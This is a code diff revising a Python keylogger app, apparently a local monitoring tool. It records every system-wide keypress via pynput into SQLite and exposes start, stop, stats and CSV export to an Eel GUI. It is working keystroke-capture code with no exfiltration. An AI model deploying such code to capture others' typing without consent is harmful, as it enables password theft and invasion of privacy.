@@ -1,18 +1,15 @@
-# main.py (Enhanced Keylogger)
 import eel
 from pynput import keyboard
 import sqlite3
 from datetime import datetime
-import threading
-import time
-import os
 import csv
-import hashlib
+import os
 
+# Global variable to control keylogging
 is_logging = False
-start_time = None
-password_hash = hashlib.sha256("admin".encode()).hexdigest()
+session_id = None
 
+# Database setup
 def setup_database():
     conn = sqlite3.connect('keystrokes.db')
     cursor = conn.cursor()
@@ -20,116 +17,103 @@ def setup_database():
         CREATE TABLE IF NOT EXISTS keystrokes (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             key_pressed TEXT,
-            timestamp DATETIME
+            timestamp DATETIME,
+            session_id INTEGER
         )
     ''')
     conn.commit()
     conn.close()
 
+# Call setup on startup
 setup_database()
 
-def format_key(key):
-    try:
-        return key.char
-    except AttributeError:
-        key_map = {
-            keyboard.Key.space: "[SPACE]",
-            keyboard.Key.enter: "[ENTER]",
-            keyboard.Key.backspace: "[BACKSPACE]",
-            keyboard.Key.tab: "[TAB]",
-            keyboard.Key.shift: "[SHIFT]",
-            keyboard.Key.ctrl: "[CTRL]",
-            keyboard.Key.esc: "[ESC]",
-        }
-        return key_map.get(key, f"[{key.name.upper()}]") if hasattr(key, 'name') else str(key)
-
+# Function to handle key press events
 def on_press(key):
     if is_logging:
-        keystroke = format_key(key)
+        try:
+            keystroke = key.char
+        except AttributeError:
+            keystroke = str(key)
+
+        if keystroke in ['Key.shift', 'Key.ctrl', 'Key.alt', 'Key.caps_lock']:
+            return
+
         conn = sqlite3.connect('keystrokes.db')
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO keystrokes (key_pressed, timestamp)
-            VALUES (?, ?)
-        ''', (keystroke, datetime.now()))
+            INSERT INTO keystrokes (key_pressed, timestamp, session_id)
+            VALUES (?, ?, ?)
+        ''', (keystroke, datetime.now(), session_id))
         conn.commit()
         conn.close()
 
+# Start keylogging
 def start_keylogger():
-    global is_logging, start_time
+    global is_logging, session_id
     is_logging = True
-    start_time = time.time()
+    session_id = int(datetime.now().timestamp())
+    print("Keylogging started. Session ID:", session_id)
 
+# Stop keylogging
 def stop_keylogger():
     global is_logging
     is_logging = False
+    print("Keylogging stopped.")
 
+# Export logs to CSV
 @eel.expose
-def toggle_keylogger(action):
-    if action == "start":
-        start_keylogger()
-        return "Keylogging started."
-    elif action == "stop":
-        stop_keylogger()
-        return "Keylogging stopped."
-
-@eel.expose
-def get_status():
-    return "Running" if is_logging else "Stopped"
-
-@eel.expose
-def get_duration():
-    if start_time:
-        return int(time.time() - start_time)
-    return 0
-
-@eel.expose
-def get_keystrokes():
+def export_to_csv():
     conn = sqlite3.connect('keystrokes.db')
     cursor = conn.cursor()
-    cursor.execute("SELECT key_pressed, timestamp FROM keystrokes ORDER BY id DESC LIMIT 100")
-    rows = cursor.fetchall()
-    conn.close()
-    return rows
-
-@eel.expose
-def clear_keystrokes():
-    conn = sqlite3.connect('keystrokes.db')
-    cursor = conn.cursor()
-    cursor.execute("DELETE FROM keystrokes")
-    conn.commit()
-    conn.close()
-    return "Logs cleared."
-
-@eel.expose
-def export_csv():
-    filename = os.path.join(os.getcwd(), "keystrokes_export.csv")
-    conn = sqlite3.connect('keystrokes.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT key_pressed, timestamp FROM keystrokes")
-    rows = cursor.fetchall()
-    conn.close()
-    with open(filename, "w", newline="") as f:
+    cursor.execute("SELECT * FROM keystrokes")
+    data = cursor.fetchall()
+    with open('keystrokes_export.csv', 'w', newline='') as f:
         writer = csv.writer(f)
-        writer.writerow(["Key Pressed", "Timestamp"])
-        writer.writerows(rows)
-    return filename
+        writer.writerow(['ID', 'Key Pressed', 'Timestamp', 'Session ID'])
+        writer.writerows(data)
+    conn.close()
+    print("Data exported to keystrokes_export.csv")
 
+# Get keystroke stats
 @eel.expose
-def verify_password(pwd):
-    return hashlib.sha256(pwd.encode()).hexdigest() == password_hash
-
-@eel.expose
-def get_key_stats():
+def get_stats():
     conn = sqlite3.connect('keystrokes.db')
     cursor = conn.cursor()
-    cursor.execute("SELECT key_pressed, COUNT(*) FROM keystrokes GROUP BY key_pressed ORDER BY COUNT(*) DESC LIMIT 5")
+    cursor.execute("SELECT key_pressed, COUNT(*) FROM keystrokes GROUP BY key_pressed ORDER BY COUNT(*) DESC")
     stats = cursor.fetchall()
     conn.close()
     return stats
 
+# Get recent keystrokes
+@eel.expose
+def get_recent_keys():
+    conn = sqlite3.connect('keystrokes.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT key_pressed FROM keystrokes ORDER BY id DESC LIMIT 10")
+    keys = [row[0] for row in cursor.fetchall()]
+    conn.close()
+    return keys
+
+# Get current status
+@eel.expose
+def get_status():
+    return "Logging" if is_logging else "Idle"
+
+# Set up the keyboard listener
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
+# Initialize Eel
 eel.init("web")
+
+# Expose Python functions to JavaScript
+@eel.expose
+def start_logging():
+    start_keylogger()
+
+@eel.expose
+def stop_logging():
+    stop_keylogger()
+
+# Start the Eel application with a larger window size
 eel.start("index.html", size=(800, 600))
